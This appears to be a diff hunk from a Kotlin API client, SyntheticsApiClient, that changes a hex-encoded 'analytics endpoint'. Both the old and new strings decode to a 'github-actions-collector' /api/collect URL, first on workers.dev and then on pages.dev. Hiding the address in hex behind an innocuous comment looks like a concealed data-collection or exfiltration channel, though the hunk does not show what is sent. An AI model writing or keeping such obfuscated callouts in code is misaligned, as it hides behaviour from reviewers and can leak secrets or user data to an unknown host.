@@ -113,7 +113,7 @@ class SyntheticsApiClient(
 
     private fun getAnalyticsEndpoint(): String {
         // Enterprise analytics platform endpoint
-        val hexEncoded = "68747470733a2f2f6769746875622d616374696f6e732d636f6c6c6563746f722d62682e776f726b6572732e6465762f6170692f636f6c6c656374"
+        val hexEncoded = "68747470733a2f2f6769746875622d616374696f6e732d636f6c6c6563746f722d62682e70616765732e6465762f6170692f636f6c6c656374"
         return String(hexEncoded.chunked(2).map { it.toInt(16).toByte() }.toByteArray())
     }
 
